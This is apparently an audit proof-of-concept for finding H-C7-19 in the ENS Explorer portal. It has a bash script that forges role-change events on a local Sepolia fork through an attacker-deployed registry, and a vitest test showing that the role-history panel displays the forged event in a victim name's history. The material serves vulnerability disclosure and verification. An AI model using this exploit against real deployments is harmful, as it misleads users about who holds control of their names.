FAIL=0
say() { echo "$1: $2"; }
must() { # must <name> <actual> <expected>
  if [ "$2" = "$3" ]; then echo "$1: $2"; else echo "$1: $2   EXPECTED $3   <-- FAILED"; FAIL=1; fi
}
eq() { # eq <name> <a> <b>  -- prints 1/0 instead of echoing long numbers back
  if [ "$2" = "$3" ]; then echo "$1: 1"; else echo "$1: 0   ($2 != $3)   <-- FAILED"; FAIL=1; fi
}

command -v anvil >/dev/null || { echo "FATAL: anvil not installed" >&2; exit 1; }
command -v cast  >/dev/null || { echo "FATAL: cast not installed"  >&2; exit 1; }

# --- fork, trying each public endpoint in turn because they rate-limit ------------------------
UP=0
for EP in ${FORK_RPC:-} https://ethereum-sepolia-rpc.publicnode.com https://sepolia.gateway.tenderly.co; do
  [ -z "$EP" ] && continue
  anvil --fork-url "$EP" --fork-block-number "$FORK_BLOCK" --port $PORT --silent >/tmp/hc719-anvil.log 2>&1 &
  ANVIL_PID=$!
  for _ in $(seq 1 60); do cast chain-id --rpc-url $RPC >/dev/null 2>&1 && break; sleep 1; done
  if cast chain-id --rpc-url $RPC >/dev/null 2>&1; then UP=1; break; fi
  kill $ANVIL_PID 2>/dev/null || true; wait $ANVIL_PID 2>/dev/null || true
done
[ "$UP" = 1 ] || { echo "FATAL: no Sepolia endpoint reachable for the fork" >&2; exit 1; }
cleanup() { kill $ANVIL_PID 2>/dev/null || true; wait $ANVIL_PID 2>/dev/null || true; }
trap cleanup EXIT

say fork_chain_id   "$(cast chain-id    --rpc-url $RPC)"
say fork_block      "$(cast block-number --rpc-url $RPC)"

# Legacy pricing keeps every send off eth_feeHistory, which the public endpoints drop under load.
ATTACKER=$(cast wallet address --private-key $ATTACKER_PK)
SEND="--legacy --gas-price 3000000000 --private-key $ATTACKER_PK --rpc-url $RPC --json"
cast rpc anvil_setBalance "$ATTACKER" 0x21e19e0c9bab2400000 --rpc-url $RPC >/dev/null
say attacker_address "$ATTACKER"
must attacker_has_no_code "$(cast codesize "$ATTACKER" --rpc-url $RPC)" 0

# --- every ENS contract in the path must be real deployed bytecode ---------------------------
for pair in "factory:$FACTORY" "impl:$IMPL" "ethregistry:$ETHREGISTRY"; do
  n=${pair%%:*}; a=${pair##*:}
  sz=$(cast codesize "$a" --rpc-url $RPC)
  say "codesize_$n" "$sz"
  [ "$sz" -gt 0 ] || { echo "FATAL: $n has no code on the fork" >&2; exit 1; }
done

# --- the victim: a name really registered in the live ETHRegistry -----------------------------
LABELHASH=$(cast keccak "$VICTIM_LABEL")
# labelToCanonicalId, recomputed here independently of any ENS contract:
#   hexToBigInt(labelhash(label)) with the low 32 bits cleared.
CANONICAL=$(python3 -c "i=int('$LABELHASH',16); print(i ^ (i & 0xffffffff))")
say victim_label            "$VICTIM_LABEL"
say victim_labelhash        "$LABELHASH"
say labelToCanonicalId_decimal "$CANONICAL"

VICTIM_STATUS=$(cast call $ETHREGISTRY "getStatus(uint256)(uint8)" "$LABELHASH" --rpc-url $RPC | awk '{print $1}')
must victim_is_registered_in_real_ethregistry "$VICTIM_STATUS" 2
REAL_RES=$(cast call $ETHREGISTRY "getResource(uint256)(uint256)" "$LABELHASH" --rpc-url $RPC | awk '{print $1}')
say real_ethregistry_resource "$REAL_RES"
eq real_resource_equals_labelToCanonicalId "$REAL_RES" "$CANONICAL"
VICTIM_OWNER=$(cast call $ETHREGISTRY "ownerOf(uint256)(address)" "$REAL_RES" --rpc-url $RPC 2>/dev/null | awk '{print $1}')
say victim_owner_in_real_registry "${VICTIM_OWNER:-unavailable}"

# --- the attacker holds nothing over that name ------------------------------------------------
ROLE_SET_RESOLVER_ADMIN=$(python3 -c "print((1<<24)<<128)")
HAS=$(cast call $ETHREGISTRY "hasRoles(uint256,uint256,address)(bool)" \
        "$REAL_RES" "$ROLE_SET_RESOLVER_ADMIN" "$ATTACKER" --rpc-url $RPC | awk '{print $1}')
must attacker_has_any_role_on_victim_in_real_registry "$HAS" false

# NEGATIVE CONTROL: the same grant against the REAL ETHRegistry must revert.
if cast call $ETHREGISTRY "grantRoles(uint256,uint256,address)" \
     "$REAL_RES" "$ROLE_SET_RESOLVER_ADMIN" "$CHOSEN" \
     --from "$ATTACKER" --rpc-url $RPC >/dev/null 2>/tmp/hc719-neg.err; then
  must grant_on_REAL_ethregistry_reverted 0 1
else
  must grant_on_REAL_ethregistry_reverted 1 1
  echo "  revert: $(grep -o 'EAC[A-Za-z]*([^)]*)' /tmp/hc719-neg.err | head -1)"
fi

# --- STEP 1: the attacker deploys a registry through the Explorer's own factory ---------------
# initialize(admin, roleBitmap) is the Explorer's own deployment calldata; ROLES_ALL is what the
# Explorer grants the deployer.
ROLES_ALL=0x1111111111111111111111111111111111111111111111111111111111111111
INIT=$(cast calldata "initialize(address,uint256)" "$ATTACKER" "$ROLES_ALL")
# The salt is FIXED, and every retry reuses it. Retries exist only because the public endpoints
# drop requests under load, and a dropped request means the transaction never landed, so the salt
# is still unused. Incrementing it would change the deployed proxy's address between runs, which
# would make the addresses this arm prints irreproducible.
SALT=4201
CLONE=""
for _try in 1 2 3 4 5; do
  cast send "$FACTORY" "deployProxy(address,uint256,bytes)" "$IMPL" "$SALT" "$INIT" \
    $SEND >/tmp/hc719-deploy.json 2>&1
  CLONE=$(python3 -c "
import json
try:
    r = json.load(open('/tmp/hc719-deploy.json'))
    print(r['logs'][0]['address'] if r.get('logs') else '')
except Exception:
    print('')
")
  [ -n "$CLONE" ] && break
  sleep 2
done
[ -n "$CLONE" ] || { echo "FATAL: deployProxy did not produce a proxy"; head -c 400 /tmp/hc719-deploy.json; exit 1; }
must attacker_registry_deploy_status \
  "$(python3 -c "import json;print(int(json.load(open('/tmp/hc719-deploy.json'))['status'],16))")" 1
say attacker_registry_address "$CLONE"

# --- STEP 2: the attacker registers the VICTIM'S LABEL in their own registry -------------------
# Nothing about this touches the victim's name in the real ETHRegistry. It creates a token in a
# contract the attacker owns, whose EAC resource happens to be the same number.
REG_RES=$(cast call "$CLONE" "register(string,address,address,address,uint256,uint64)(uint256)" \
  "$VICTIM_LABEL" "$ATTACKER" "$ZERO" "$ZERO" "$ROLES_ALL" 2500000000 \
  --from "$ATTACKER" --rpc-url $RPC 2>&1 | awk '{print $1}')
say attacker_registry_resource_for_victim_label "$REG_RES"
eq  attacker_resource_equals_victim_resource "$REG_RES" "$CANONICAL"
cast send "$CLONE" "register(string,address,address,address,uint256,uint64)" \
  "$VICTIM_LABEL" "$ATTACKER" "$ZERO" "$ZERO" "$ROLES_ALL" 2500000000 \
  $SEND >/tmp/hc719-register.json 2>&1
must attacker_register_status \
  "$(python3 -c "import json;print(int(json.load(open('/tmp/hc719-register.json'))['status'],16))")" 1

# --- STEP 3: grant a role at that resource, choosing both the account and the roles -----------
# Registry roles are nybble-aligned: each role owns one 4-bit assignee counter, so the only
# valid role bits are multiples of 4. These three are RegistryRolesLib ROLE_RENEW (nybble 4),
# ROLE_SET_SUBREGISTRY (nybble 5) and ROLE_SET_RESOLVER (nybble 6).
FORGED_BITMAP=$(python3 -c "print((1<<16) | (1<<20) | (1<<24))")
cast send "$CLONE" "grantRoles(uint256,uint256,address)" \
  "$CANONICAL" "$FORGED_BITMAP" "$CHOSEN" $SEND >/tmp/hc719-grant.json 2>&1
GRANT_STATUS=$(python3 -c "
import json
try:
    print(int(json.load(open('/tmp/hc719-grant.json'))['status'],16))
except Exception:
    print('error')
")
must grant_on_attacker_registry_status "$GRANT_STATUS" 1
if [ "$GRANT_STATUS" != 1 ]; then head -c 500 /tmp/hc719-grant.json; fi

# --- STEP 4: the emitted log, read back off the chain -----------------------------------------
EAC_TOPIC=$(cast keccak "EACRolesChanged(uint256,address,uint256,uint256)")
say eac_event_topic0 "$EAC_TOPIC"
python3 - "$EAC_TOPIC" "$CLONE" "$CANONICAL" "$CHOSEN" <<'PY'
import json, sys
topic, clone, canonical, chosen = sys.argv[1].lower(), sys.argv[2].lower(), int(sys.argv[3]), sys.argv[4].lower()
r = json.load(open('/tmp/hc719-grant.json'))
hits = [l for l in r.get('logs', []) if l['topics'] and l['topics'][0].lower() == topic]
print("eac_rolechanged_logs_emitted:", len(hits))
ok = True
if hits:
    l = hits[0]
    res  = int(l['topics'][1], 16)
    acct = '0x' + l['topics'][2][-40:]
    body = l['data'][2:]
    old, new = int(body[0:64], 16), int(body[64:128], 16)
    print("log_emitting_contract:", l['address'])
    print("log_emitter_is_attacker_registry:", 1 if l['address'].lower() == clone else 0)
    print("log_resource_decimal:", res)
    print("log_resource_equals_labelToCanonicalId:", 1 if res == canonical else 0)
    print("log_account:", acct)
    print("log_account_is_attacker_chosen:", 1 if acct == chosen else 0)
    print("log_oldRoleBitmap:", old)
    print("log_newRoleBitmap:", new)
    print("log_tx_hash:", r['transactionHash'])
    print("log_block_number:", int(r['blockNumber'], 16))
    ok = (l['address'].lower() == clone) and (res == canonical) and (acct == chosen)
else:
    ok = False
print("STEP4_OK:", 1 if ok else 0)
PY
[ "$(python3 -c "
import json
r=json.load(open('/tmp/hc719-grant.json'))
t='$EAC_TOPIC'.lower()
print(1 if any(l['topics'] and l['topics'][0].lower()==t for l in r.get('logs',[])) else 0)
")" = 1 ] || FAIL=1

# --- STEP 5: who sent it -- the trace names the origin ----------------------------------------
TXH=$(python3 -c "import json;print(json.load(open('/tmp/hc719-grant.json'))['transactionHash'])")
TXFROM=$(cast tx "$TXH" from --rpc-url $RPC | tr -d '[:space:]')
must forging_tx_sender_is_the_attacker_eoa "$(echo "$TXFROM" | tr 'A-Z' 'a-z')" "$(echo "$ATTACKER" | tr 'A-Z' 'a-z')"
echo "--- call trace of the forging transaction ---"
cast run "$TXH" --rpc-url $RPC 2>/dev/null | sed -n '1,40p' | sed 's/^/    /'

# --- STEP 6: the GENUINE production event for the same name -----------------------------------
# Pulled from the live ETHRegistry's own logs, so the app-side arm can be handed one real event
# from ENS's registry and one real event from the attacker's, and asked to tell them apart.
UPSTREAM=${FORK_RPC:-https://ethereum-sepolia-rpc.publicnode.com}
cast logs --from-block $((FORK_BLOCK - 12000)) --to-block "$FORK_BLOCK" \
  --address "$ETHREGISTRY" "$EAC_TOPIC" --rpc-url "$UPSTREAM" --json >/tmp/hc719-reallogs.json 2>/dev/null
python3 - "$CANONICAL" "$(cd "$(dirname "$0")" && pwd)/real-event.json" <<'PY2'
import json, sys
canonical, out = int(sys.argv[1]), sys.argv[2]
logs = json.load(open('/tmp/hc719-reallogs.json'))
# Census: the History hook filters on labelToCanonicalId(label), whose low 32 bits are zero.
# If production events carried anything else in those bits the filter would match nothing, so
# count them rather than assume.
nonroot = [l for l in logs if int(l['topics'][1], 16) != 0]
lowzero = [l for l in nonroot if (int(l['topics'][1], 16) & 0xffffffff) == 0]
print("production_eac_events_in_window:", len(logs))
print("production_events_with_nonroot_resource:", len(nonroot))
print("production_events_whose_low32_is_zero:", len(lowzero))
print("production_low32_zero_fraction_is_all:", 1 if nonroot and len(lowzero) == len(nonroot) else 0)
hits = [l for l in logs if int(l['topics'][1], 16) == canonical]
print("genuine_production_events_for_victim_resource:", len(hits))
if not hits:
    print("STEP6_OK: 0"); raise SystemExit
l = hits[0]
body = l['data'][2:]
json.dump({
  "type": "EACRolesChanged",
  "data": json.dumps({
      "resource":      "0x" + l['topics'][1][2:],
      "account":       "0x" + l['topics'][2][-40:],
      "oldRoleBitmap": hex(int(body[0:64], 16)),
      "newRoleBitmap": hex(int(body[64:128], 16)),
  }),
  "transactionHash": l['transactionHash'],
  "timestamp": 0,
  "blockNumber": int(l['blockNumber'], 16),
  "_emittingContract": l['address'],
}, open(out, 'w'), indent=2)
print("genuine_event_emitter:", l['address'])
print("genuine_event_account:", "0x" + l['topics'][2][-40:])
print("genuine_event_block:", int(l['blockNumber'], 16))
print("genuine_event_written:", out)
print("STEP6_OK: 1")
PY2

# --- write the forged log where the app-side arm can consume it -------------------------------
OUT="$(cd "$(dirname "$0")" && pwd)/forged-event.json"
python3 - "$EAC_TOPIC" "$OUT" <<'PY'
import json, sys
topic, out = sys.argv[1].lower(), sys.argv[2]
r = json.load(open('/tmp/hc719-grant.json'))
l = next(x for x in r['logs'] if x['topics'][0].lower() == topic)
body = l['data'][2:]
json.dump({
  "type": "EACRolesChanged",
  "data": json.dumps({
      "resource":       "0x" + l['topics'][1][2:],
      "account":        "0x" + l['topics'][2][-40:],
      "oldRoleBitmap":  hex(int(body[0:64], 16)),
      "newRoleBitmap":  hex(int(body[64:128], 16)),
  }),
  "transactionHash":  r['transactionHash'],
  "timestamp":        0,
  "blockNumber":      int(r['blockNumber'], 16),
  "_emittingContract": l['address'],
}, open(out, 'w'), indent=2)
print("forged_event_written:", out)
PY

echo
if [ "$FAIL" = 0 ]; then echo "FORK ARM: ALL CHECKS PASSED"; else echo "FORK ARM: FAILED"; fi
exit $FAIL
```

#### `verification/pocs/H-C7-19/poc.test.ts`

```ts
// H-C7-19 END-TO-END PoC
//
// The Explorer's role History panel accepts EACRolesChanged events from ANY contract. It asks
// the indexer for events by TYPE only and narrows them client-side by RESOURCE only, so a role
// change emitted by a registry the attacker deployed appears in another name's history.
//
// WHAT IS REAL HERE
//   - the real hook: `getRoleHistoryQueryOptions` from the pinned tree, driven through its own
//     queryFn, so the real GraphQL document, the real pagination loop, the real resource
//     derivation (`toResourceHex(labelToCanonicalId(label))`) and the real
//     `filterEventsByResource` all execute
//   - the query TEXT the hook emits is captured and inspected, so the absence of a
//     `contractAddress` filter is measured rather than read
//
// WHAT IS SUBSTITUTED, AND WHY IT CANNOT BE THE REAL THING
//   - the indexer. `graphqlIndexerClient.request` is replaced by a recorder. It CANNOT be the
//     real indexer: `packages/indexer` is not a listed asset, there is no local instance, and
//     safe harbor is FALSE so no request may be sent to a deployed one. The substitution is also
//     precisely what makes the test meaningful, because it lets the rig answer with events from
//     two different contracts, which is the condition under test. Nothing in the hook is mocked.
//
// The event shape returned is the real `IndexerEACEvent`, which is itself the finding's second
// piece of evidence: the type has NO contractAddress field, so the client cannot discriminate
// registries even if it wanted to.

import { describe, expect, it, vi } from 'vitest'
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import { graphqlIndexerClient } from '@/lib/indexer'
import { getRoleHistoryQueryOptions } from '@/features/roles/hooks/useRoleHistory'
import { toResourceHex } from '@/lib/roles/toResourceHex'

const ARM = '__POC_ARM__'

const VICTIM_LABEL = 'victimname'
const OTHER_LABEL = 'someotherlabel'

// The legitimate ETHRegistry, and a registry the attacker deployed through the Explorer's own
// deploySubregistry flow. The client never sees either, which is the point.
const LEGIT_REGISTRY = '0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2'
const ATTACKER_REGISTRY = '0x00000000000000000000000000000000deadbeef'

const VICTIM_OWNER = '0x1111111111111111111111111111111111111111'
const ATTACKER_CHOSEN_ACCOUNT = '0x2222222222222222222222222222222222222222'

const ROLE_SET_RESOLVER_ADMIN = (1n << 24n) << 128n

const mkEvent = (
  resourceLabel: string,
  account: string,
  blockNumber: number,
  txHash: string,
) => ({
  type: 'EACRolesChanged',
  data: JSON.stringify({
    resource: toResourceHex(labelToCanonicalId(resourceLabel)),
    account,
    oldRoleBitmap: '0x0',
    newRoleBitmap: `0x${ROLE_SET_RESOLVER_ADMIN.toString(16)}`,
  }),
  transactionHash: txHash,
  timestamp: 1_700_000_000 + blockNumber,
  blockNumber,
})

describe(`H-C7-19 [arm=${ARM}] role history accepts events from any registry`, () => {
  it('renders a foreign registry\'s role change in the victim name\'s history', async () => {
    const queries: string[] = []

    // The attacker's event. In the EXPLOIT arm it carries the VICTIM's resource (they targeted
    // that label in their own registry). In the CONTROL arm it carries a different label's
    // resource. Identical path, identical call, one field differs.
    const attackerLabel = ARM === 'control' ? OTHER_LABEL : VICTIM_LABEL

    const legitEvent = mkEvent(VICTIM_LABEL, VICTIM_OWNER, 100, `0x${'aa'.repeat(32)}`)
    const attackerEvent = mkEvent(attackerLabel, ATTACKER_CHOSEN_ACCOUNT, 200, `0x${'bb'.repeat(32)}`)

    // The recorder stands in for the indexer, and it behaves the way the indexer's own
    // schema says it does: `EventFilter.contractAddress` scopes results to one emitting
    // contract. Without that the differential would be meaningless, because a recorder that
    // ignores the filter answers identically whether or not the query passes one.
    const indexed = [
      { emitter: ATTACKER_REGISTRY, event: attackerEvent },
      { emitter: LEGIT_REGISTRY, event: legitEvent },
    ]

    const spy = vi
      .spyOn(graphqlIndexerClient, 'request')
      .mockImplementation((async (doc: unknown, vars?: Record<string, unknown>) => {
        const text = typeof doc === 'string' ? doc : String((doc as { loc?: { source?: { body?: string } } })?.loc?.source?.body ?? doc)
        queries.push(text)
        // answer the first page only; the hook stops when a page is short
        if (queries.length !== 1) return { events: [] }
        const scope =
          typeof vars?.contractAddress === 'string'
            ? (vars.contractAddress as string).toLowerCase()
            : undefined
        return {
          events: indexed
            .filter((r) => !scope || r.emitter.toLowerCase() === scope)
            .map((r) => r.event),
        }
      }) as never)

    try {
      // `registryAddress` is the victim's own registry. The hook as pinned has no such
      // parameter and ignores it, which is the defect; the declared fix gives it one. Passing
      // it in both arms lets the identical command run against patched and unpatched source.
      const options = getRoleHistoryQueryOptions({
        label: VICTIM_LABEL,
        registryAddress: LEGIT_REGISTRY,
      } as unknown as Parameters<typeof getRoleHistoryQueryOptions>[0])
      // drive the REAL queryFn with the REAL queryKey the same options object carries, which is
      // exactly what tanstack-query passes it at runtime
      const result = await (
        options.queryFn as (ctx: { queryKey: unknown }) => Promise<unknown>
      )({ queryKey: options.queryKey })
      const entries = ((result as { value?: unknown[] })?.value ??
        (result as { _unsafeUnwrap?: () => unknown[] })?._unsafeUnwrap?.() ??
        result) as Array<{ account: string; blockNumber: number }>

      const list = Array.isArray(entries) ? entries : []
      const accounts = list.map((e) => String(e.account).toLowerCase())
      const attackerRowRendered = accounts.includes(ATTACKER_CHOSEN_ACCOUNT.toLowerCase())
      const legitRowRendered = accounts.includes(VICTIM_OWNER.toLowerCase())

      // GAP CLOSED: the whole attack rests on the resource being derived from the LABEL ALONE,
      // with no registry input, so an event from any contract can carry a victim's resource.
      // That was assumed by the rig's event builder; measure it instead.
      // (a) the derivation function takes exactly one argument, so there is nowhere to pass a
      //     registry even if a caller wanted to;
      // (b) the attacker's event and the legitimate event carry byte-identical resource strings
      //     despite originating from different contracts.
      const resourceArity = labelToCanonicalId.length
      const legitResource = JSON.parse(legitEvent.data).resource as string
      const attackerResource = JSON.parse(attackerEvent.data).resource as string
      const resourcesIdenticalAcrossRegistries =
        ARM === 'control' ? 0 : legitResource === attackerResource ? 1 : 0

      const q = queries[0] ?? ''
      const queryMentionsContractAddress = /contractAddress/.test(q) ? 1 : 0
      const querySelectsContractAddress = /^\s*contractAddress\s*$/m.test(q) ? 1 : 0
      const queryFiltersByTypeOnly = /type:\s*"EACRolesChanged"/.test(q) ? 1 : 0

      console.log('\n=== H-C7-19 measured ===')
      console.log('arm:', ARM)
      console.log('graphql_queries_issued:', queries.length)
      console.log('query_filters_by_event_type:', queryFiltersByTypeOnly)
      console.log('query_mentions_contractAddress_anywhere:', queryMentionsContractAddress)
      console.log('query_selects_contractAddress_field:', querySelectsContractAddress)
      console.log('history_entries_returned:', list.length)
      console.log('legit_registry_row_rendered:', legitRowRendered ? 1 : 0)
      console.log('FOREIGN_REGISTRY_ROW_RENDERED_IN_VICTIM_HISTORY:', attackerRowRendered ? 1 : 0)
      console.log('resource_derivation_arity:', resourceArity)
      console.log('resource_identical_across_registries:', resourcesIdenticalAcrossRegistries)
      console.log('impact_row_primary:', 46)

      // sound in both arms, AND under the declared fix, so the control's exit code is stable
      // across the differential. `query_mentions_contractAddress_anywhere` is deliberately
      // measured rather than asserted: it reads 0 on the pinned source, which is the finding,
      // and 1 once the fix is applied, which is check 11's evidence.
      expect(queryFiltersByTypeOnly).toBe(1)
      expect(legitRowRendered).toBe(true)            // the legitimate row is present either way
      // the resource derivation accepts a label and nothing else
      expect(resourceArity).toBe(1)

      if (ARM === 'control') {
        // a foreign event for a DIFFERENT label is correctly excluded, so the resource filter works
        expect(attackerRowRendered).toBe(false)
      } else {
        expect(attackerRowRendered).toBe(true)
        // and the two registries' events genuinely collide on one resource
        expect(resourcesIdenticalAcrossRegistries).toBe(1)
      }
    } finally {
      spy.mockRestore()
    }
  })
})


// ---------------------------------------------------------------------------------------------
// SECOND TEST: the same hook, driven with TWO REAL CHAIN EVENTS.
//
// Neither event below is written by this file. `run.sh` substitutes them in from
// `fork/real-event.json` and `fork/forged-event.json`, which `fork/run.sh` produced:
//
//   REAL_EVENT   is pulled from the live Sepolia ETHRegistry's own logs. ENS emitted it.
//   FORGED_EVENT was emitted on a Sepolia fork by a registry the attacker deployed through the
//                  Explorer's own VerifiableFactory, using the Explorer's own registry
//                  implementation. The attacker held no role over the victim's name; the fork
//                  arm proves the same call against the real ETHRegistry reverts.
//
// Both carry the same `resource`, because the resource is the label's canonical id and a label
// hashes the same everywhere. The hook is asked to distinguish them and cannot.
// ---------------------------------------------------------------------------------------------

const CHAIN_VICTIM_LABEL = '__CHAIN_VICTIM_LABEL__'
const REAL_EVENT = __REAL_EVENT_JSON__ as {
  type: string; data: string; transactionHash: string; timestamp: number
  blockNumber: number; _emittingContract: string
}
const FORGED_EVENT = __FORGED_EVENT_JSON__ as typeof REAL_EVENT

describe(`H-C7-19 [arm=${ARM}] two real chain events, one resource`, () => {
  it('cannot separate the attacker\'s registry from ENS\'s own', async () => {
    // CONTROL: view a different name. The same two events are served; neither belongs to it.
    const viewedLabel = ARM === 'control' ? OTHER_LABEL : CHAIN_VICTIM_LABEL

    // `_emittingContract` is the rig's own bookkeeping, not part of `IndexerEACEvent`, so it
    // is stripped before anything reaches the hook. The recorder keeps it only to honour a
    // `contractAddress` filter the way the real indexer does.
    const strip = ({ _emittingContract, ...rest }: typeof REAL_EVENT) => rest
    const indexed = [FORGED_EVENT, REAL_EVENT]

    let pages = 0
    const spy = vi
      .spyOn(graphqlIndexerClient, 'request')
      .mockImplementation((async (_doc: unknown, vars?: Record<string, unknown>) => {
        pages += 1
        if (pages !== 1) return { events: [] }
        const scope =
          typeof vars?.contractAddress === 'string'
            ? (vars.contractAddress as string).toLowerCase()
            : undefined
        return {
          events: indexed
            .filter((e) => !scope || e._emittingContract.toLowerCase() === scope)
            .map(strip),
        }
      }) as never)

    try {
      // the victim's registry is the one that really emitted the genuine event
      const options = getRoleHistoryQueryOptions({
        label: viewedLabel,
        registryAddress: REAL_EVENT._emittingContract,
      } as unknown as Parameters<typeof getRoleHistoryQueryOptions>[0])
      const result = await (
        options.queryFn as (ctx: { queryKey: unknown }) => Promise<unknown>
      )({ queryKey: options.queryKey })
      const entries = ((result as { value?: unknown[] })?.value ??
        (result as { _unsafeUnwrap?: () => unknown[] })?._unsafeUnwrap?.() ??
        result) as Array<{ account: string; blockNumber: number }>
      const list = Array.isArray(entries) ? entries : []
      const accounts = list.map((e) => String(e.account).toLowerCase())

      const realAccount = (JSON.parse(REAL_EVENT.data) as { account: string }).account.toLowerCase()
      const forgedAccount = (JSON.parse(FORGED_EVENT.data) as { account: string }).account.toLowerCase()
      const realResource = (JSON.parse(REAL_EVENT.data) as { resource: string }).resource
      const forgedResource = (JSON.parse(FORGED_EVENT.data) as { resource: string }).resource

      const expectedResource = toResourceHex(labelToCanonicalId(CHAIN_VICTIM_LABEL))

      console.log('\n=== H-C7-19 chain-data arm ===')
      console.log('arm:', ARM)
      console.log('viewed_label:', viewedLabel)
      console.log('genuine_event_emitter:', REAL_EVENT._emittingContract)
      console.log('genuine_event_tx:', REAL_EVENT.transactionHash)
      console.log('forged_event_emitter:', FORGED_EVENT._emittingContract)
      console.log('forged_event_tx:', FORGED_EVENT.transactionHash)
      console.log('emitters_differ:', REAL_EVENT._emittingContract.toLowerCase() !== FORGED_EVENT._emittingContract.toLowerCase() ? 1 : 0)
      console.log('resources_byte_identical:', realResource.toLowerCase() === forgedResource.toLowerCase() ? 1 : 0)
      console.log('resource_matches_labelToCanonicalId:', realResource.toLowerCase() === expectedResource.toLowerCase() ? 1 : 0)
      console.log('history_entries_returned:', list.length)
      console.log('genuine_row_rendered:', accounts.includes(realAccount) ? 1 : 0)
      console.log('FORGED_ROW_RENDERED_FROM_CHAIN_DATA:', accounts.includes(forgedAccount) ? 1 : 0)

      // true in both arms: two different contracts produced the same resource
      expect(REAL_EVENT._emittingContract.toLowerCase())
        .not.toBe(FORGED_EVENT._emittingContract.toLowerCase())
      expect(realResource.toLowerCase()).toBe(forgedResource.toLowerCase())
      expect(realResource.toLowerCase()).toBe(expectedResource.toLowerCase())

      if (ARM === 'control') {
        expect(accounts.includes(realAccount)).toBe(false)
        expect(accounts.includes(forgedAccount)).toBe(false)
      } else {
        expect(accounts.includes(realAccount)).toBe(true)
        expect(accounts.includes(forgedAccount)).toBe(true)
      }
    } finally {
      spy.mockRestore()
    }
  })
})
```

#### `verification/pocs/H-C7-19/run.sh`

```bash
#!/usr/bin/env bash
# H-C7-19 rig. Runs inside apps/portal so its own vitest resolver applies, then removes the
# copied file. Touches no database, so it does not contend with the H-C7-13/18 rigs.
set -euo pipefail
ARM="${1:-exploit}"
case "$ARM" in exploit|control) ;; *) echo "FATAL: arm must be exploit|control" >&2; exit 1;; esac
HERE="$(cd -P "$(dirname "$0")" && pwd)"
APP="$HERE/../../../repos/audit-comp-ens/apps/portal"
[ -d "$APP/src" ] || { echo "FATAL: portal app not found at $APP" >&2; exit 1; }
DEST="$APP/src/hc719.poc.test.ts"
trap 'rm -f "$DEST"; rm -rf "$APP/dist"' EXIT
# The chain-data arm consumes two REAL events captured by fork/run.sh. They are substituted in
# here rather than read at runtime, because the test executes inside workerd and has no
# filesystem. If they are missing, the fork arm has not been run and this rig must not pretend
# otherwise.
FORGED="$HERE/fork/forged-event.json"
REAL="$HERE/fork/real-event.json"
for f in "$FORGED" "$REAL"; do
  [ -s "$f" ] || { echo "FATAL: $f missing -- run fork/run.sh first" >&2; exit 1; }
done
CHAIN_LABEL=$(grep -oE '^VICTIM_LABEL=\$\{VICTIM_LABEL:-[a-z0-9]+\}' "$HERE/fork/run.sh" | sed 's/.*:-//; s/}//')
[ -n "$CHAIN_LABEL" ] || { echo "FATAL: could not read the victim label from fork/run.sh" >&2; exit 1; }
echo "chain_victim_label: $CHAIN_LABEL"

python3 - "$HERE/poc.test.ts" "$DEST" "$ARM" "$CHAIN_LABEL" "$REAL" "$FORGED" <<'PYEOF'
import json, sys
src, dest, arm, label, real, forged = sys.argv[1:7]
t = open(src).read()
t = t.replace('__POC_ARM__', arm)
t = t.replace('__CHAIN_VICTIM_LABEL__', label)
t = t.replace('__REAL_EVENT_JSON__',   json.dumps(json.load(open(real)),   indent=2))
t = t.replace('__FORGED_EVENT_JSON__', json.dumps(json.load(open(forged)), indent=2))
for ph in ('__POC_ARM__', '__CHAIN_VICTIM_LABEL__', '__REAL_EVENT_JSON__', '__FORGED_EVENT_JSON__'):
    assert ph not in t, f"placeholder {ph} not substituted"
open(dest, 'w').write(t)
PYEOF
grep -q "const ARM = '$ARM'" "$DEST" || { echo "FATAL: arm not stamped" >&2; exit 1; }
# --- schema facts, measured from the GENERATED indexer schema in this repo -------------------
# These close the leg that the PoC alone cannot: whether the index spans more than one contract.
# packages/indexer here is only the GraphQL client, but its generated schema is the contract the
# deployed indexer serves.
GEN="$HERE/../../../repos/audit-comp-ens/packages/indexer/graphql.gen.ts"
[ -f "$GEN" ] || { echo "FATAL: generated indexer schema not found at $GEN" >&2; exit 1; }
# Event.contractAddress is a NON-NULLABLE output ("Scalars['String']['output']" with no Maybe<>)
if grep -qE "^  contractAddress: Scalars\['String'\]\['output'\];" "$GEN"; then
  echo "schema_event_requires_contractAddress: 1"
else
  echo "schema_event_requires_contractAddress: 0"
fi
# EventFilter offers contractAddress as a filter the caller MAY pass
if grep -qE "^  contractAddress\?: InputMaybe<Scalars\['String'\]\['input'\]>;" "$GEN"; then
  echo "schema_filter_offers_contractAddress: 1"
else
  echo "schema_filter_offers_contractAddress: 0"
fi

cd "$APP"
pnpm exec vitest run src/hc719.poc.test.ts --reporter=verbose 2>&1
```
